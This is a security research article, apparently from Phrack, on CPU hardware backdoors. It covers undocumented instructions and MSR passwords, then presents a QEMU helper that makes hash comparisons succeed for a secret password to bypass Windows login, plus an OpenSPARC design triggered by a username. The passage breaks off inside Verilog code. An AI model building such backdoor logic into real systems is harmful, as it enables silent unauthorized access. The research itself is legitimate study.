set tw=75
gq: "rewrap the text."

|=-----------------------------------------------------------------------=|
|=--------------------------=[ A CPU Backdoor  ]=------------------------=|
|=-----------------------------------------------------------------------=|
|=------------------=[ uty <whensungoes@gmail.com> ]=--------------------=|
|=-----------------------------------------------------------------------=|

--[ Table of contents

1. Introduction
2. Known CPU "Backdoors"
    2.1 VIA C3 ALTINST Instructions 
    2.2 AMD Secret Password 0x9C5A203A
3. A New CPU Backdoor
    3.1 Backdoored Instruction to Bypass OS Authentication
    3.2 Windows on X86
    3.3 Linux on Sparc64
4. Greetings
5. References
6. Appendix: Code


--[ 1. Introduction

CPU backdoor is fascinating. There is no evidence showing it exists, but
people would be surprised if there is no backdoor built into Intel and AMD
chips. Security researchers envision various possible CPU backdoor and how
the backdoor gets triggered, such as undocumented/hidden instructions, a
unique register value to open mystical function, monitoring system bus for
specific data patterns, etc. Most of those ideas function like a local
exploit whose goal is to obtain a higher system privilege.

But how can you get into the system in the first place? That is the
question for me. It reminds me of a movie scene from Swordfish. Standly was
asked to login into DoD's system. He admitted he had planned a trojan horse
there. He tried to log in many times and succeeded at the last second.
(Didn't he have the backdoor?)

Suppose I am a CPU manufacturer. My CPU has a backdoor that allows me to
log in to any computer with my CPU installed. Is it possible? Things like
IPMI(Intelligent Platform Management Interface), BMC(Baseboard Management
Controller), and Intel AMT(Active Management Technology) can do this.
Still, those are large systems and are hard to go completely undetected.
Preferably, the backdoor is hidden in the CPU, but it's hard for a single
instruction to work through all the software layers to function except for
a halt-and-catch-fire instruction. So the hard part is that hardware needs
cooperation from the software. Fortunately/unfortunately, the operating
system authentication module, intentionally or unintentionally, has not
changed for many years. It even gets centralized, like the PAM(Pluggable
Authentication Modules). This is a good opportunity for the CPU to know the
software.

Many years ago, there was a hacking technique—an ATM equipped with a
Windows XP system. A hacker found this ATM has a firewire port exposed. To
bypass Windows XP authentication, the hacker leveraged the firewire port to
access the computer's memory and patched the code that verifies the input
password. Therefore, the hacker can log into this ATM without a password.
What code to patch? The Windows logon process pads the input password and
generates a 32-byte hash string using NTLM proprietary hashing algorithm.
Windows XP's msv1_0.dll compares the generated hash string with the one
stored in the SAM(Security Accounts Manager) database.
MsvpPasswordValidate() is the function that needs to be patched to return
true even when the password entered is wrong. For concealment, a predefined
password hash can also be encoded in the function so that a secret password
can log in with any username in the system.

More interestingly, the hash is unsalted. Even Windows 10 is still using
the unsalted hash. That would make it convenient to implement a CPU
password backdoor. In the ALU (Arithmetic Logic Unit), malicious circuity
waits for a predefined hash value. If it comes, the ALU will modify the
result of the CMP instruction to make the system believe that the hash is
correct, thus allowing the user to login. 

To show that this backdoor can be implemented on a real commercial CPU, I
decided to build it on OpenSPARC T1, the open-source version of the Sun
Microsystem UltraSPARC T1. The OpenSPARC provides a Xilinx EDK (Embedded
Development Kit) project for running the T1 system on a Xilinx
ML505-V5LX110T evaluation board. 

However, the Windows system can not run on a SPARC machine. So I made two
demos. I use QEMU with TCG (Tiny Code Generator) to demonstrate the
backdoor for the Windows system on the X86 virtual machine. I also
implemented the backdoor on the OpenSPARC T1 in Verilog code and tested it
with a Linux system.

For Linux, the *nix systems use salted hash, making the backdoor a little
complex, but it is still feasible. Because of the salt, the CPU can not
recognize any predefined hash values. However, the username will be the
only clear text message passed to the CPU before successful authentication.
Again, this is not a task that the CPU can complete alone. As mentioned
above, it requires software to cooperate, being unchanged for decades. 


--[ 2. Known CPU "Backdoors"

When it comes to CPU backdoors, people may first think of hidden
instructions. For example, the attacker can obtain the highest privilege by
executing a particular instruction. Indeed, there are undocumented
instructions[5][6][7][8]. Examing the opcode space from the manual, we know
that there must be many opcodes that are not documented or not used yet.
However, all the instructions must comply with the opcode encoding rule,
and it is not hard to enumerate all possible instructions.  But still,
there may have some unreviled extension byte for those variety length
instruction architecture, such as x86.

The opcode partially pasted in the following is the 2-byte opcode map.
Those instructions' first bye is 0F, which is an escape code. Let's take
some examples to see how it works. In the first row, the INVD instruction
should be 0F08. WBINVD is 0F09. In the fourth row, vmovapd should be
660F28, because the map says it has a prefix 66.


+---------------------------------------------         -------------------+
|  |pfx|    8   |   9   |     A    |   B    |          |   E    |     F   |
|--+---+--------+-------+----------+--------+-         +--------+---------|
| 0|   |INVD    |WBINVD |          |2-byte  |          |        |         |
|  |   |        |       |          |illegal |    ...   |        |         |
|  |   |        |       |          |opcodes |          |        |         |
|  |   |        |       |          |  UD2   |          |        |         |
|--+---+--------+-------+----------+----------         +--------+---------|
| 1|   |Prefetch|                                               |NOP /0 Ev|
|  |   |(Grp 16)|                                               |         |
|--+---+--------+-------+----------+----------         +--------+---------|
|  |   |vmovaps |vmovaps| cvtpi2ps |vmovntps|          |vucomiss| vcomiss |
|  |   |Vps,Wps |Wps,Vps| Vps,Qpi  |Mps,Vps |          |Vss,Wss | Vss,Wss |
|  |---+--------+-------+----------+--------+-   ...   +--------+---------|
|  | 66|vmovapd |vmovapd| cvtpi2pd |vmovntpd|          |vucomisd| vcomisd |
|  |   |Vpd,Wpd |Wpd,Vpd| Vpd,Qpi  |Mpd,Vpd |          |Vsd,Wsd | Vsd,Wsd |
| 2|---+--------+-------+----------+--------+-         +--------+---------|
|  | F3|        |       |vcvtsi2ss |        |          |        |         |
|  |   |        |       |Vss,Hss,Ey|        |          |        |         |
|  |---+--------+-------+----------+--------+-         +--------+---------|
|  | F2|        |       |vcvtsi2sd |        |          |        |         |
|  |   |        |       |Vsd,Hsd,Ey|        |    ...   |        |         |
|--+---+--------+-------+----------+--------+-         +--------+---------|
| 3|   | 3-byte |       |  3-byte  |        |          |        |         |
|  |   | escape |       |  escape  |        |          |        |         |
|--+---+--------+-------+----------+--------+-         +--------+---------|
|       ...                                                               |
 

There are also many blanks on the map. For example, 0F0A is blank here, so
it is either an undocumented or invalid instruction. The ALTINST(0F3F) we
will talk about later also leaves a blank. In this case, it is a not-fully
-documented instruction of the VIA CPU. The manual mentioned the existence
of this alternative instruction but did not fully describe how to use it.
Instead, the customers need to call the vendor to get detailed information.

The map also shows "3-byte escape" in the seventh row, which means the
instructions begin with 0F38 or 0F3A, which are the escape code, and the
following byte also needs to be decoded. We could look up the corresponding
3-byte opcode map to find more instructions of this kind. Although in the
Intel manual, the 3-byte opcode is already the most, in theory, the
subsequent bytes could also be escape code. Also, the blank between 0F38
and 0F3A may make people wonder what 0F39 is. Is it an undocumented
instruction or an undocumented escape code? And what about other blanks.
Therefore I argue that this is where we should start digging, finding all
the escape code, instead of enumerating the whole encoding space from
scratch.

In another situation, the instruction is documented, but it may require
some particular value put in a register to trigger it[15][16][27]. Like
CPUID, with different register values, it can query various CPU
information. A debugging function of the AMD CPU needs to be turned on like
this. We hope to have a mysterious instruction that can give us something
unique but not affect the system's regular operations, so it will not be
easily discovered. Maybe using particular register values for triggering is
a better approach, especially on 64-bit systems.


--[ 2.1 VIA C3 ALTINST Instructions

The VIA C3 processor has an instruction called ALTINST[9] encoding 0F 3F.
This instruction is officially documented in the C3 manual, and ALTINST is
the gate instruction to the alternate instruction set. This alternate
instruction set includes an extended set of integer, MMX, floating-point,
and 3DNow! instructions, additional registers, and more powerful
instruction forms over the x86 instruction architecture. For example, in
the alternate instruction set, privileged functions can be used from any
protection level, memory descriptor checking can be bypassed, and many x86
exceptions such as alignment check can be bypassed. These instructions are
undocumented and are believed to be RISC-like microcodes that run
internally in the CPU.

"This alternate instruction set is intended for testing, debug, and special
application usage. Accordingly, it is not documented for general usage. If
you have a justified need for access to these instructions, contact your
VIA representative." Says the manual.

Using these instructions requires the ALTINST bit to be set to 1 in FCR
(FEATURE CONTROL REGISTER) MSR using WRMSR instruction. If ALTINST is 0,
the execution of 0F3F causes an Invalid Instruction exception. Once the
ALTINST bit is set, the 0F3F instruction can be executed from any privilege
level, and it causes a near branch to CS:EAX. In addition to the branch,
the 0x0F3F instruction sets the processor into an internal mode where the
target bytes are not interpreted as x86 instructions but rather as
alternate instruction set instructions.

The alternate instructions fetched following the 0x0F3F branch should be of
the form 0x8D8400XXXXXXXX where 0xXXXXXXXX is the 32-bit alternate
instruction, which is presented as the 32-bit displacement of an LEA
[EAX+EAX+disp]. The LEA "wrapper" is stripped off upon fetching, and the
32-bit alternate instruction is executed. This is where this set of
alternate instructions looks like a backdoor because if the disassembler 


--[ 2.2 AMD Secret Password 0x9C5A203A

MSR (Model Specific Register) are the various control registers in the x86
instruction set used for debugging, program execution tracing, computer
performance monitoring, and toggling certain CPU features. Reading and
writing to these registers are handled by the RDMSR and WRMSR instructions,
respectively, with a 32-bit integer as the MSR index. Of course, there are
undocumented MSRs. But more interestingly, some undocumented MSRs require a
password to access. (Even only some bit need the password to write.)
0x9C5A203A is the famous password that enables the hidden debugging
function of AMD K8 processors. Internet user Czernobyl reveals that
undocumented MSRs are used for debugging[15]. It needs to put the password
0x9C5A203A in the EDI to enable the debugging capability[16]. Otherwise, a
GPF exception occurs.

An AMD white paper called "Live Migration with AMD-V Extended Migration
Technology" mentions password-protected MSRs. The following code sample
shows how a VMM (or OS) can hide reporting of RDTSCP instruction on the
Second-Generation AMD Opteron processor.

/*
 * Example 3: Use MSR C001_1005 to clear bit 27 (RDTSCP) reported in
 * EDX after CPUID Function 8000_0001
 */

        /*
         Read current value of the CPUID Override MSR C001_1005.
         After RDMSR completes, EDX:EAX contains the 64bit MSR value.
         EDX is loaded with the high 32 bits of the MSR and EAX is loaded
         with the low 32 bits. The low 32 bits of this MSR are returned in
         EDX after CPUID Function 8000_0001
        */

        /*
         Write the new EDX:EAX value into CPUID override MSR.
         Second-Generation AMD Opteron Processors require a
         32 bit password in EDI. Contact AMD to get the password.
        */

                MOV EDI, <PASSWORD>
        
                MOV CX, 0xC0011005h
                RDMSR

        /*
         Clear bit 27 (RDTSCP) of EAX register
        */

                ANDL EAX, 0xF7FFFFFFh
                WRMSR



While RDMSR and WRMSR are already privileged instructions, the undocumented
MSR plus a 32-bit password in specific a register should not conflict with
regular kernel programs. Moreover, from AMD's white paper, even if it is
the same MSR c0011005h, the password is only required for writing a
specific bit. It makes discovering such hidden features more difficult.



--[ 3. A New CPU Backdoor

The previously mentioned known backdoors, or other proposed ideas, require
the attacker to be able to execute instructions on the system. Sometimes
the challenge is how to get into the system in the first place. Password
authentication has been an essential system authentication method to this
day.  The user provides his username and password to the computer, and the
computer makes a judgment. If the CPU is backdoored, the attacker can find
a way to say to the CPU, "Hey, it's me, let me in."


--[ 3.1 Backdoored Instruction to Bypass OS Authentication

First, we need to know the password authentication works. In the Windows
system, the logon process pads the user input password and generates a
16-byte hash using NTLM proprietary hashing algorithm. Then unction
MsvpPasswordValidate() from msv1_0.dll calls RtlCompareMemory() to compare
the generated hash string with the one stored in the SAM database. If they
match, the authentication is successful.

The following is RtlCompareMemory's code.

ntdll!RtlCompareMemory:
76ff6970 56 push esi
76ff6971 57 push edi
76ff6972 fc cld
76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
76ff697f c1e902 shr ecx,2
76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)

ntdll!RtlCompareMemory+0x14:
76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)

ntdll!RtlCompareMemory+0x18:
76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
76ff698c 83e103 and ecx,3
76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)

ntdll!RtlCompareMemory+0x21:
76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)

ntdll!RtlCompareMemory+0x25:
76ff6995 8b442414 mov eax,dword ptr [esp+14h]
76ff6999 5f pop edi
76ff699a 5e pop esi
76ff699b c20c00 ret 0Ch

ntdll!RtlCompareMemory+0x2e:
76ff699e 83ee04 sub esi,4
76ff69a1 83ef04 sub edi,4
76ff69a4 b904000000 mov ecx,4
76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]

ntdll!RtlCompareMemory+0x3b:
76ff69ab 4e dec esi
76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
76ff69b0 8bc6 mov eax,esi
76ff69b2 5f pop edi
76ff69b3 5e 

The hash data is 16 bytes long, and the memory is allocated word-aligned,
so it takes four 32-bit comparisons on x86 systems and two 64-bit
comparisons on x86_64 systems using CMPS instruction.

x86
"f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"

x86_64 
"f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"

The way the system library compares the hash is crucial for us. Because if
compared byte by byte, the hash data will be lost in the massive number of
regular CMPS instructions. 

The esi and edi registers have the two hashes' memory addresses, and ecx
stores the number of comparisons to make. "repe" or "repz" is the repeat
prefix, so the CMPS instruction repeatedly executes until the ecx decrease
to zero, or the previous result is unequal.

This is the core of Windows system password authentication, although the
instructions here do not know the meaning of the compared content.  Unlike
software, various information can be obtained, such as call stack and
process information. For the CPU, after decoding and loading the memory
operands, it may only take one clock cycle to execute this CMPS
instruction, with no more context. The only thing that can be recognized in
the execute cycle is the data itself.

For example, we choose "123" as the secret password. Its hash is
0x97e6bd3da79016d7eb4b206978362812. On x86 systems, the CMPS instruction
will see 0x97e6bd3d, 0xa79016d7, 0xeb4b2069 and 0x78362812 appear on the
edi register in turn. Similarly, the values are 0xa79016d797e6bd3d and
0x78362812eb4b2069 in the rdi register on x86_64 systems. So when the
backdoored CPU sees these values from a CMPS instruction, no matter what
the value is in the esi or rsi register, it sets the Z flag, indicating
that the two operands are equal. It means "123" will be successfully
authenticated against any password in the system.


--[ 3.2 Windows on X86

I wish to implement this backdoor on a real x86 CPU. Unfortunately, I can
not find an open-source x86 CPU that is mature enough to run the Windows
system, nor can I make one myself right now. But the Windows system is
especially suitable for this CPU backdoor because Windows is not open
source, maintained by a private company, password hashing has always been
unsalted, and the authentication library has not changed for over a decade.
Therefore, I use the QEMU TCG emulator to demonstrate the backdoor design.
I implemented a more complicated CPU backdoor on OpenSPARC T1 by changing
its Verilog RTL code, shown in the following section.

TCG(Tiny Code Generator) is the dynamic binary translation engine for QEMU.
It transforms target instructions via the TCG front-end to TCG ops (in c
code) which are then compiled into host instructions. This technique is
called Dynamic Binary Translation. Although it is still pure software
emulation, it is much faster than the emulator that interprets each
instruction, such as Bochs.

The following function is a good start to working on TCG.

static target_ulong disas_insn (DisasContext *s, CPUState *cpu);

It is located at "target/i386/tcg/translate.c" and both x86 and x86_64
architecture use the same file. disas_insn() has a gigantic switch-case
that decodes each instruction. 0xa7 is the opcode for CMPS with dword
operands, as shown in the following code.

    case 0xa6: /* cmpsS */
    case 0xa7:
        ot = mo_b_d(b, dflag);
        if (prefixes & PREFIX_REPNZ) {
            gen_repz_cmps(s, ot, pc_start - s->cs_base,
                          s->pc - s->cs_base, 1);
        } else if (prefixes & PREFIX_REPZ) {
            gen_repz_cmps(s, ot, pc_start - s->cs_base, 
                          s->pc - s->cs_base, 0);
        } else {
            gen_cmps(s, ot);
        }
        break;

Function gen_cmps() handles individual CMPS instruction, and
gen_repz_cmps() is a micro that handles prefixed CMPS and eventually calls
gen_cmps().

static inline void gen_cmps(DisasContext *s, MemOp ot)
{
    gen_string_movl_A0_EDI(s);
    gen_op_ld_v(s, ot, s->T1, s->A0);
    gen_string_movl_A0_ESI(s);
    gen_op(s, OP_CMPL, ot, OR_TMP0);
    gen_op_movl_T0_Dshift(s, ot);
    gen_op_add_reg_T0(s, s->aflag, R_ESI);
    gen_op_add_reg_T0(s, s->aflag, R_EDI);
}

The gen_cmps() are composed of co-called TCG front-end ops[25].  They are C
functions prefixed with tcg_, such as tcg_gen_mov_tl(). TCG also provides a
helper_function mechanism to help emulate more complex operations.

static inline void gen_cmps(DisasContext *s, MemOp ot)
{
    TCGv ret0;
    ret0 = tcg_temp_local_new();

    gen_string_movl_A0_EDI(s);
    gen_op_ld_v(s, ot, s->T1, s->A0);
    gen_string_movl_A0_ESI(s);

    gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
    gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);

    gen_op_movl_T0_Dshift(s, ot);
    gen_op_add_reg_T0(s, s->aflag, R_ESI);
    gen_op_add_reg_T0(s, s->aflag, R_EDI);

    tcg_temp_free(ret0);
}

A helper function gen_helper_malicious_cmps() is added. When handling CMPS
instruction, gen_cmps() calls it to check whether the edi or rdi matches
part of the secret password hash. Using TCG ops can also do the check, and
it runs faster, but the helper function can call printf and all other
libraries, which makes the debugging much more comfortable. The following
is the helper code for both x86 and x86_64 architectures.

#ifdef TARGET_X86_64
target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
{
    target_ulong val = 0;
    
    if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
    {
        printf("helper_malicious_cmps: edi 0x%llx\n", 
                                      (long long unsigned int)rdi);
        val = 1;
    }
    
    return val;
}
#else
target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
{
    target_ulong val = 0;

    if (edi == 0x97e6bd3d || edi == 0xa79016d7 
     || edi == 0xeb4b2069 || edi == 0x78362812)
    {
        printf("helper_malicious_cmps: edi 0x%x\n", edi);
        val = 1;
    }

    return val;
}
#endif

If the CPU sees any edi or rdi values matching part of the secret password
hash, it sets the Z flag in the EFLAGS register for the current CMPS
instruction, indicating that the two operands are equal. Once all the
hash-related CMPS is compromised, the password will pass. In this case, it
means "123" will be successfully authenticated against any password in the
system.

On this QEMU virtual machine, no matter what Windows system is installed,
you can use "123" as the secret password to log in to any user, and the
Windows system does not need to make any changes.


--[ 3.3 Linux on Sparc64

To show how this backdoor is practical in a commercial CPU, I decided to
implement it on OpenSPARC T1. OpenSPARC is an open-source hardware project
that started in December 2005. OpenSPARC T1 is the open-source version of
the Sun Microsystems' UltraSPARC T1, which is multithreading, multicore
CPU, code name Niagara.

OpenSPARC T1 contains multiple sparc cores, a single-issue, in-order,
6-stage pipeline core. The source code is available under GNU General
Public License v2. Xilinx's OpenSPARC Evaluation Platform is an FPGA board
designed for hosting a whole OpenSPARC T1 system, including CPU, DDR memory
controller, and etc. With the source code and those Xilinx EDA
tools and the FPGA board, that's the real commercial CPU as far as I can
get.

The OpenSPARC project also provides two ramdisk images that can run on top
of the FPGA emulated system, SunOS 5.11 and Ubuntu7.10. Those systems are
old. They both have a 64-bit kernel, but the user-mode programs are
32-bits. According to the "SPARC Assembly Language Reference Manual[x]," a
32-bit program could use the entire length of some of the 64-bit registers.
"The global registers and the output registers can be used to hold 64-bit
integer values, but the input registers and the local registers can only be
used to hold 32-bit values in the lower half of the register."

The Linux distro Ubuntu7.10 contains 32-bit libc-2.6.1.so, whose strcmp()
uses 64-bit registers to hold parts of the Src and Dst strings. If the two
strings' addresses are 8-byte aligned, strcmp() does the comparison using a
pseudo instruction CMP, a SUBcc, with 64-bit register operands.  Otherwise,
the strcmp() will go a single-byte route.

SunOS 5.11, on the other hand, their libc library is compiled in a way that
the instructions only use 32-bit operands. They didn't leverage the larger
registers even if they could. It is not surprising since the libc used by
these two systems does not have a common heritage.  

Later, I checked Debian 9.0, a purely 64-bit system on SPARC64
architecture. Its strcmp() function behaves like the Ubuntu7.10 on a
SPARC32+ architecture. I have to say, at the instruction level, from the
perspective of our CPU backdoor, the Linux system (more specifically, the
Debian system) has not changed much over the years. Although on Debian9.0,
it uses XOR instead of CMP to make the integer comparison. A small change
can make the backdoor we designed ineffective. That is why we argue that
even hardware backdoors need software assistance. 

If we originally designed the backdoor on the SUB instruction, and the
later system used the XOR instruction instead, our backdoor would be
invalid. In reality, Maybe the CPU vendor can convince the compiler guys
not to make the change if it matters. Still, the reality is that there is a
lot of elderly code that runs perfectly on billions of computers. As
aforementioned, the Windows authentication library msv1_0.dll is a good
example. 

There is another issue with *nix systems. They use salt. On SunOS 5.11,
When you change your password, the /bin/passwd program selects a salt based
on the time of day, and the salt is converted into a two-character string
and is stored as part of the hash. 

To make the point, I will make this particular CPU backdoor on the SUBcc
instruction of the OpenSPARC T1 CPU for the Ubuntu 7.10 system. It targets
the login process, which uses libpam (Pluggable Authentication Modules for
Linux) to verify the password against the stored hash string. On
Ubuntu7.10, like all other Linux systems,  the administrator could choose
between different hash algorithms such as MD5 and SHA256. 

"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"

"u:$6$zE3nVD4laY6MS31E$NK4TnaebdS.O9FX9Q.pg7/yH.fH5bi8bHCFJdFbEaPtmW/59KK
B7JDk53W21ZoLnKhrkmB4u5cXE.9ynmeIEw0:18811:0:99999:7:::"

Take md5 as an example. The hash starts with $1$. The second part is the
salt string that ends with another $, and its size varies depending on the
algorithm. The rest are the hash.

The problem is that, unlike windows, with salt mixed during the hash
process, even the same password could generate millions of different hash
strings. After the hashing process, the CPU could no longer recognize the
backdoor password. For this reason, the only way to send a clear message to
the CPU during authentication is the user name. It is so especially when
authenticating through a network.

Therefore, we need to turn on/off the CPU backdoor by entering unique
usernames. The libpam takes the username and looks it up in the
/etc/password file. For example, "00000000" is the secret key to turn on
the CPU backdoor. This 8-byte username will be put into a 64-bit register
and treated as an integer. The CPU will see a "CMP reg-rs1 reg-rs2"
instruction with 0x726f6f7400000000 in the rs1 register and
0x3030303030303030 in the rs2 register. It is "00000000" compared with
"root," usually the first username in a *nix system.

When the CPU sees this, it looks further for the hash comparison. The sign
would be $1$ in both rs1 and rs2 registers. Why is that?  Let's look at the
hash strings in the /etc/shadow file.

"root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"

The hash string has three parts. The $1$ indicates the algorithm is md5,
"7c71xB0y"  is the salt, and "mPkMSwwbMWgEXsyD6YV/C1" is the actual hash.
The hash function in the *nix system mostly looks like the following.

char * crypt(const char *phrase, const char *setting);

For example, the libpam passes the user's input password and the hash
string from the /etc/shadow file to the crypt() function.

pp = crypt("passwordinputed", "$1$somesalt$hashedstring");

The returned value is a pointer to the newly generated hash string, and
they both are sent to strcmp() for comparison. 

strcmp(pp, stored_hash);

When the CMP instruction has the two register operands that begin with $1$,
we know the CPU verifies the user password. And this is the place we need
to modify the result. The CPU will say they are equal no matter the newly
generated hash.

OpenSPARC T1 is a single-issue, in-order processor written in Verilog.
Unlike the emulator, the actual CPU has many pipeline stages, and different
tasks are spread into each stage. The sparc core is composed of
IFU(Instruction Fetch Unit), EXU(execution Unit), LSU(Load-Store Unit),
TLU(Trap Logic Unit), etc. For simplicity, we can think of the core as two
parts, IFU and EXU， where IFU gets the instructions from the cache/memory,
and the EXU executes them.

The core pipeline consists of six stages: Fetch, Switch, Decode, Execute,
Memory, and Writeback. The IFU includes Fetch, Switch, and Decode. The EXU
includes the Execute stage of the pipeline and contains four subunits
ALU(Arithmetic and logic unit), SHFT(Shifter), IMUL(Integer multiplier),
and IDI(Integer divider).

Ths sparc core has hardware support for four strands(virtual processor) and
each strand has a full register file. The Fetch cycle loads instructions to
the instruction registers from the instruction cache. The Switch stage
selects which strand to run. Then the selected strand's next instruction is
decoded in the Decode stage. The register file access also happens at this
time. In the Execute stage, all arithmetic and logical operations take
place. The LSU also calculates the memory address at this stage, and the
data cache is accessed in the Memory stage. Finally, all instructions are
committed in the Writeback stage.

To modify the behavior of a CMP(SUBcc) instruction, we can work on the ALU
subunits of the EXU module. At the Execute cycle, the two operands of a SUB
instruction are read out and sent to the ALU. 


The following is the ALU module code.

module sparc_exu_alu
(
 /*AUTOARG*/
   // Outputs
   so, alu_byp_rd_data_e, exu_ifu_brpc_e, exu_lsu_ldst_va_e, 
   exu_lsu_early_va_e, exu_mmu_early_va_e, alu_ecl_add_n64_e, 
   alu_ecl_add_n32_e, alu_ecl_log_n64_e, alu_ecl_log_n32_e, 
   alu_ecl_zhigh_e, alu_ecl_zlow_e, exu_ifu_regz_e, exu_ifu_regn_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   alu_ecl_adder_out_63_e, alu_ecl_cout32_e, alu_ecl_cout64_e_l, 
   alu_ecl_mem_addr_invalid_e_l, 
   // Inputs
   rclk, se, si, byp_alu_rs1_data_e, byp_alu_rs2_data_e_l, 
   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, ecl_alu_rd_e, 
   ifu_exu_invert_d, ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e, 
   ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e, 
   ecl_alu_out_sel_sum_e_l, ecl_alu_out_sel_rs3_e_l, 
   ecl_alu_out_sel_shift_e_l, ecl_alu_out_sel_logic_e_l, 
   shft_alu_shift_out_e, ecl_alu_sethi_inst_e, ifu_lsu_casa_e
   );
   input rclk;
   input se;
   input si;
   input [63:0] byp_alu_rs1_data_e;   // source operand 1
   input [63:0] byp_alu_rs2_data_e_l;  // source operand 2
   input [63:0] byp_alu_rs3_data_e;  // source operand 3
   input [63:0] byp_alu_rcc_data_e;  // source operand for reg cond codes
   input        ecl_alu_cin_e;            // cin for adder
   input [4:0]  ecl_alu_rd_e;        // uty: test
   input        ifu_exu_invert_d;
   input  ecl_alu_log_sel_and_e;// These 4 wires are select lines
   input  ecl_alu_log_sel_or_e;// for the logic block mux.
   input  ecl_alu_log_sel_xor_e;// active high and choose the
   input  ecl_alu_log_sel_move_e; // output they describe
   input  ecl_alu_out_sel_sum_e_l;// The following 4 are select lines
   input  ecl_alu_out_sel_rs3_e_l;// for the output stage mux. They are 
   input  ecl_alu_out_sel_shift_e_l;// active high and choose the 
   input  ecl_alu_out_sel_logic_e_l;// output of the respective block.
   input [63:0] shft_alu_shift_out_e;// result from shifter
   input        ecl_alu_sethi_inst_e;
   input        ifu_lsu_casa_e;
   
   output       so;
   output [63:0] alu_byp_rd_data_e;          // alu result
   output [47:0] exu_ifu_brpc_e;// branch pc output
   output [47:0] exu_lsu_ldst_va_e; // address for lsu
   output [10:3] exu_lsu_early_va_e; // faster bits for cache
   output [7:0]  exu_mmu_early_va_e;
   output        alu_ecl_add_n64_e;
   output        alu_ecl_add_n32_e;
   output        alu_ecl_log_n64_e;
   output        alu_ecl_log_n32_e;
   output        alu_ecl_zhigh_e;
   output        alu_ecl_zlow_e;
   output    exu_ifu_regz_e;              // rs1_data == 0 
   output    exu_ifu_regn_e;
   output    alu_ecl_adderin2_63_e;
   output    alu_ecl_adderin2_31_e;
   output    alu_ecl_adder_out_63_e;
   output    alu_ecl_cout32_e;       // To ecl of sparc_exu_ecl.v
   output    alu_ecl_cout64_e_l;       // To ecl of sparc_exu_ecl.v
   output    alu_ecl_mem_addr_invalid_e_l;
                                
   wire         clk;
   wire [63:0] logic_out;       // result of logic block
   wire [63:0] adder_out;       // result of adder
   wire [63:0] spr_out;         // result of sum predict
   wire [63:0] zcomp_in;        // result going to zcompare
   wire [63:0] va_e;            // complete va
   wire [63:0] byp_alu_rs2_data_e;
   wire        invert_e;
   wire        ecl_alu_out_sel_sum_e;
   wire        ecl_alu_out_sel_rs3_e;
   wire        ecl_alu_out_sel_shift_e;
   wire        ecl_alu_out_sel_logic_e;
   assign      clk = rclk;
   assign      byp_alu_rs2_data_e[63:0] = ~byp_alu_rs2_data_e_l[63:0];
   assign      ecl_alu_out_sel_sum_e = ~ecl_alu_out_sel_sum_e_l;
   assign      ecl_alu_out_sel_rs3_e = ~ecl_alu_out_sel_rs3_e_l;
   assign      ecl_alu_out_sel_shift_e = ~ecl_alu_out_sel_shift_e_l;
   assign      ecl_alu_out_sel_logic_e = ~ecl_alu_out_sel_logic_e_l;

   // Zero comparison for exu_ifu_regz_e
   sparc_exu_aluzcmp64 regzcmp(.in(byp_alu_rcc_data_e[63:0]), 
				.zero64(exu_ifu_regz_e));
   assign     exu_ifu_regn_e = byp_alu_rcc_data_e[63];

   // mux between adder output and rs1 (for casa) for lsu va
   dp_mux2es #(64)  lsu_va_mux(.dout(va_e[63:0]),
                               .in0(adder_out[63:0]),
                               .in1(byp_alu_rs1_data_e[63:0]),
                               .sel(ifu_lsu_casa_e));
   assign     exu_lsu_ldst_va_e[47:0] = va_e[47:0];
   // for bits 10:4 we have a separate bus that is not used for cas
   assign     exu_lsu_early_va_e[10:3] = adder_out[10:3];
   // mmu needs bits 7:0
   assign     exu_mmu_early_va_e[7:0] = adder_out[7:0];
   
   
   // Adder
   assign     exu_ifu_brpc_e[47:0] = adder_out[47:0];
   assign     alu_ecl_adder_out_63_e = adder_out[63];
   sparc_exu_aluaddsub addsub(.adder_out(adder_out[63:0]),
                        /*AUTOINST*/
                        // Outputs
                        .spr_out  (spr_out[63:0]),
                        .alu_ecl_cout64_e_l(alu_ecl_cout64_e_l),
                        .alu_ecl_cout32_e(alu_ecl_cout32_e),
                        .alu_ecl_adderin2_63_e(alu_ecl_adderin2_63_e),
                        .alu_ecl_adderin2_31_e(alu_ecl_adderin2_31_e),
                        // Inputs
                        .clk      (clk),
                        .se       (se),
                        .byp_alu_rs1_data_e(byp_alu_rs1_data_e[63:0]),
                        .byp_alu_rs2_data_e(byp_alu_rs2_data_e[63:0]),
                        .ecl_alu_cin_e(ecl_alu_cin_e),
  		        .ecl_alu_rd_e(ecl_alu_rd_e),   // uty: test
                        .ifu_exu_invert_d(ifu_exu_invert_d));

   // Logic/pass rs2_data
   dff_s invert_d2e(.din(ifu_exu_invert_d), .clk(clk), .q(invert_e), 
                    .se(se), .si(), .so());
   sparc_exu_alulogic logic(.rs1_data(byp_alu_rs1_data_e[63:0]),
                       .rs2_data(byp_alu_rs2_data_e[63:0]),
                       .isand(ecl_alu_log_sel_and_e),
                       .isor(ecl_alu_log_sel_or_e),
